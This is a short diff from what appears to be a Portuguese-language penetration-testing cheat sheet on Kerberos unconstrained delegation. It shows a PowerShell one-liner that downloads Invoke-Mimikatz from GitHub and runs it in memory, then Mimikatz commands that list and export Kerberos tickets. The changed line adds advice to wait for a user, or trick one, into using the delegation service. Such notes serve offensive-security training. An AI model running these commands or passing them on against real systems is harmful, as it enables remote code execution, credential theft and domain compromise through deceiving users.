@@ -1281,7 +1281,7 @@ Invoke-Mimikatz
 IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/Invoke-Mimikatz.ps1")
 Invoke-Mimikatz
 ```
-MIMIKATZ - LISTAR OS TICKETS / EXPORTAR OS TICKETS
+MIMIKATZ - LISTAR OS TICKETS / EXPORTAR OS TICKETS  (WAIT OR TRICK AN USER TO USE THE UNCONSTRAINED DELEGATION SERVICE)
 ```
 sekurlsa::tickets
 sekurlsa::tickets /export
